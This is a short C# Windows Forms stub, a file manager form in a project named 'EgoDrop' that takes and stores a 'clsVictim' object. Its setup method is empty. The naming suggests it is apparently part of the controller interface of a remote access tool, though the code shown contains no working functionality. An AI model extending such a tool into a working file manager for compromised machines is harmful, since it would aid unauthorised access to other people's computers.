using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmFileMgr : Form
    {
        private clsVictim m_victim;

        public frmFileMgr(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        private void fnSetup()
        {

        }

        private void frmFileMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }
    }
}
